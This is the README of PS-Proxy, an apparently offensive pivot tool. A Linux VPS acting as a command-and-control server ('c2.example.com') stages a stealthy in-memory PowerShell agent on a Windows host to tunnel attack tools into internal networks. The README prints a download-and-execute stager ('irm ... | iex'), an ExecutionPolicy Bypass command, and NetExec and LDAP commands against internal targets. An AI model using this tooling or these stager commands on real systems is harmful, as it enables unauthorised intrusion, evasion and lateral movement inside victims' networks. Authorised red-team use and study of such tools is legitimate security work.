# PS-Proxy

PS-Proxy is a route-based TCP pivot for operators who need to reach internal
network services from a Linux VPS through a Windows host that can access those
services. It is built for TCP-heavy tooling such as Impacket, NetExec,
and TCP-connect `nmap` without proxychains and without
requiring local administrator privileges on the Windows agent host.

The tool has two parts:

- **Linux server:** a Go binary that listens over TLS, stages one-time agent
  downloads, manages the encrypted tunnel, and redirects routed TCP traffic into
  the tunnel.
- **Windows agent:** a single PowerShell 5.1 script that loads the embedded C#
  core in memory, enrolls with the server, and opens outbound TCP connections to
  internal targets from the Windows host's network position.

## How it works

1. You run `psproxy-server` on a Linux amd64 VPS with a public domain and TLS
   certificate.
2. The server creates or reuses a stable PS-Proxy identity key
   (`psproxy_identity.pem`) and prints a one-time PowerShell staging command.
3. You run the printed command on a Windows host that can reach the target
   network.
4. The staged agent verifies the PS-Proxy identity inside the TLS connection,
   enrolls over an authenticated encrypted tunnel, and starts relaying traffic.
5. On the Linux server, your tools connect directly to routed target IPs. In
   transparent redirect mode, PS-Proxy installs iptables NAT rules that redirect
   matching TCP connections into the local relay. The server preserves the
   original destination and asks the agent to open that target from the Windows
   side.

The Windows agent does not intentionally write the managed payload DLL to disk, maintaining stealth.
Release agents load the embedded assembly with
`[System.Reflection.Assembly]::Load(byte[])`.

## Quick start from a release zip

Use this path if you downloaded a prebuilt release zip and do not want to build
from source.

### Requirements

- A Linux amd64 VPS.
- A public DNS name that points to the VPS.
- A valid TLS certificate and private key for that DNS name.
- If you do not already have a certificate, point your domain at the VPS and use Certbot, for example `sudo certbot certonly --standalone -d c2.example.com`.
- Root privileges on the Linux server when using transparent redirect mode.
- A Windows host with Windows PowerShell 5.1 that can make outbound HTTPS
  connections to the VPS and can reach the internal target network.

### Release zip layout

Extract the release zip and keep the included directory structure intact:

```text
psproxy-release/
├── psproxy-server
├── agent/
│   └── loader/
│       └── agent.ps1.tmpl
└── release/
    └── agent_assembly.b64
```

The server uses `agent/loader/agent.ps1.tmpl` and `release/agent_assembly.b64`
by default when you run it from the extracted directory.

### Start the server

From the extracted release directory, run:

```bash
chmod +x ./psproxy-server
sudo ./psproxy-server \
  --domain c2.example.com \
  --cert /etc/letsencrypt/live/c2.example.com/fullchain.pem \
  --key /etc/letsencrypt/live/c2.example.com/privkey.pem \
  --route 10.10.10.0/24 \
  --redirect \
  --max-streams 256
```

Replace:

- `c2.example.com` with your domain.
- The `--cert` and `--key` paths with your certificate paths.
- `10.10.10.0/24` with the internal network reachable from the Windows host.

If your certificate is in the default Let's Encrypt location for the domain, you
can omit `--cert` and `--key`:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --route 10.10.10.0/24 \
  --redirect
```

By default, PS-Proxy listens on `0.0.0.0:443`. If another service already uses
port 443, set `--listen` or `--port`

### Run the Windows agent

When the server starts, it prints a one-time PowerShell command like:

```powershell
irm https://c2.example.com/a/<one-time-id> | iex
```

Run that command in Windows PowerShell 5.1 on the Windows host that can reach the
internal network. After the agent enrolls, keep the PowerShell session running
for as long as you need the tunnel.

Alternatively, if you don't want to use the irm | iex workflow, the agent can be downloaded
from the provided link and ran with . .\agent.ps1

### Use your tools

From the Linux server, connect to hosts in the routed CIDR directly. For example:

```bash
nxc smb 10.10.10.219 -u user -p password -d pwned.local
```

With `--redirect`, matching TCP connections to `--route` networks are redirected
through PS-Proxy and opened by the Windows agent from its network position.

### Optional DNS relay

If you want DNS queries to be forwarded through the agent to an internal DNS
server, add both DNS flags when starting the server:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --route 10.10.10.0/24 \
  --redirect \
  --dns-listen 127.0.0.1:53 \
  --dns-target 10.10.10.10:53
```

Then point DNS-capable tools at `127.0.0.1:53` when they support a custom DNS
server.

### Optional fixed-target TCP relay

For a single local port mapped to a single internal target, use the fixed-target
TCP relay:

```bash
sudo ./psproxy-server \
  --domain c2.example.com \
  --tcp-listen 127.0.0.1:1389 \
  --tcp-target 10.10.10.10:389
```

After the agent connects, use the local listener:

```bash
ldapsearch -x -H ldap://127.0.0.1:1389 -b 'DC=example,DC=local' '(objectClass=domain)'
```

### Operational notes

- Keep `psproxy_identity.pem` private and stable across restarts. It is the
  PS-Proxy application identity used by staged agents.
- Enrollment URLs are short-lived and one-time use.
- Do not log generated agent bodies, enrollment tokens, or reconnect tokens.
- The server needs permission to install and remove iptables NAT rules when
  `--redirect` is enabled.

## Build from source

Use this path if you cloned the repository and want to produce the server binary
and packaged agent assets yourself. (Or don't trust that the base64 blob is clean lol)

### Requirements

- Go 1.24 or newer for the Linux server.
- A Windows machine with Windows PowerShell 5.1 and the .NET Framework C#
  compiler for building the release agent.

### Build the Linux server

From the repository root on Linux:

```bash
go test ./...
go build -o psproxy-server ./cmd/psproxy-server
```

For a smaller release binary:

```bash
go build -trimpath -ldflags="-s -w" -o psproxy-server ./cmd/psproxy-server
```

### Build the PowerShell release agent

From the repository root on Windows, run:

```powershell
powershell -ExecutionPolicy Bypass -File tools\build-agent.ps1
```

The build script writes:

- `release/agent.ps1` — a single-file PowerShell loader with the embedded agent
  assembly.
- `release/agent_assembly.b64` — the compressed/base64 agent assembly used by
  the server when rendering one-time staged agents.

### Assemble a release directory

Create a release directory with the server binary and packaged agent assets:

```text
psproxy-release/
├── psproxy-server
├── agent/
│   └── loader/
│       └── agent.ps1.tmpl
└── release/
    └── agent_assembly.b64
```

You can now zip `psproxy-release/` and distribute it as a ready-to-run Linux
amd64 release bundle for operators who provide their own domain and TLS
certificate.
